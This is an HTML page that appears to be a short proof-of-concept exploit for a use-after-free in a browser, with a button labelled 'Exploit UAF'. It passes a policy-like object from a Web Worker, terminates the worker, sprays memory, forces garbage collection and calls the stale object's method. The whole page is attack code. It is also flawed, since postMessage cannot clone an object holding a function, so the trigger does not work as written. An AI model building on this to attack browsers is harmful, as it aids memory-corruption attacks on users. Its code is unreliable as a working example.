<!DOCTYPE html>
<html>
<head>
    <script>
        function exploitUAF() {
            let worker = new Worker(URL.createObjectURL(new Blob([`
                self.onmessage = function() {
                    let policy = {
                        createScriptURL: function(url) { return url; }
                    };
                    self.postMessage(policy);
                };
            `], { type: 'text/javascript' })));

            worker.onmessage = function(e) {
                let policy = e.data;
                worker.terminate();
                let memoryHog = new Array(10000);
                for (let i = 0; i < 10000; i++) {
                    memoryHog[i] = new Uint8Array(2048);
                }
                if (typeof gc === "function") gc();
                setTimeout(() => {
                    try {
                        console.log(policy.createScriptURL("test"));
                    } catch (e) {
                        console.error(e.message);
                        alert(e.message);
                    }
                }, 500);
            };

            worker.postMessage(null);
        }
    </script>
</head>
<body>
    <button onclick="exploitUAF()">Exploit UAF</button>
</body>
</html>